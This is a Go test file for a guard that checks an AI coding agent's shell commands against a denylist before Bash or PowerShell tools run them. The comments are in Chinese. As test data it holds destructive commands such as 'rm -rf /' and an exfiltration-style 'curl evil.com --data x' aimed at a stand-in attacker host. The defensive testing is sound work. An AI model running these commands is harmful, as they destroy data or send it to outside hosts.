package chain

import (
	"strings"
	"testing"
)

func TestDenied_命中内置默认(t *testing.T) {
	bl := DefaultDenylist()
	if !Denied("rm -rf /", bl) {
		t.Error("rm -rf 应被默认黑名单拦")
	}
	if Denied("ls -la", bl) {
		t.Error("普通命令不应被拦")
	}
}

func TestDenied_合并段追加(t *testing.T) {
	bl := MergeDenylist(DefaultDenylist(), []string{"curl evil.com"})
	if !Denied("curl evil.com --data x", bl) {
		t.Error("段追加项应生效")
	}
}

func TestSettingsJSON_含PreToolUse与guard(t *testing.T) {
	s := SettingsJSON("ccr")
	if !strings.Contains(s, "PreToolUse") || !strings.Contains(s, "__chain_guard") {
		t.Errorf("settings 应含 PreToolUse 钩子调 __chain_guard: %s", s)
	}
	// matcher 必须覆盖 Windows 的 PowerShell 工具：经校准 claude 在 Windows 用
	// PowerShell 工具而非 Bash，仅匹配 "Bash" 的钩子在 Windows 不触发。
	if !strings.Contains(s, "Bash") || !strings.Contains(s, "PowerShell") {
		t.Errorf("PreToolUse matcher 应同时覆盖 Bash 与 PowerShell, got: %s", s)
	}
}

func TestDenied_大小写不敏感(t *testing.T) {
	bl := DefaultDenylist()
	// Windows PowerShell 大小写不敏感，RM 是 Remove-Item 别名；不区分大小写才拦得住。
	if !Denied("RM -RF /tmp", bl) {
		t.Error("大写 RM -RF 也应被拦")
	}
	if !Denied("Git Push origin", bl) {
		t.Error("混合大小写 Git Push 也应被拦")
	}
}

func TestCommandFromHookInput(t *testing.T) {
	cmd := CommandFromHookInput([]byte(`{"tool_name":"Bash","tool_input":{"command":"rm -rf /"}}`))
	if cmd != "rm -rf /" {
		t.Errorf("应取出 Bash 命令, got %q", cmd)
	}
	if CommandFromHookInput([]byte("not json")) != "" {
		t.Error("坏 JSON 应返回空串")
	}
}
